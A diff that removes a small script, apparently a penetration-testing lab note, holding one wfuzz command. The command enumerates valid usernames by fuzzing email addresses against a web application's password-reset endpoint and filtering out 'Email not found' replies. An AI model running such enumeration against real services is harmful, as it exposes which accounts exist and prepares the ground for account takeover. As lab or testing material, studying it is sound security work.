@@ -1,6 +1,0 @@
-#!/usr/bin/peno
-
-#user enum with reset function
- wfuzz -c -L -u "https://192.168.120.107/app/controllers/ResetPasswordController.php" -d "email=FUZZ@source.pg&Submit=" -b "PHPSESSID=FUZZ" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt --hs 'Email not found'
- 
- 
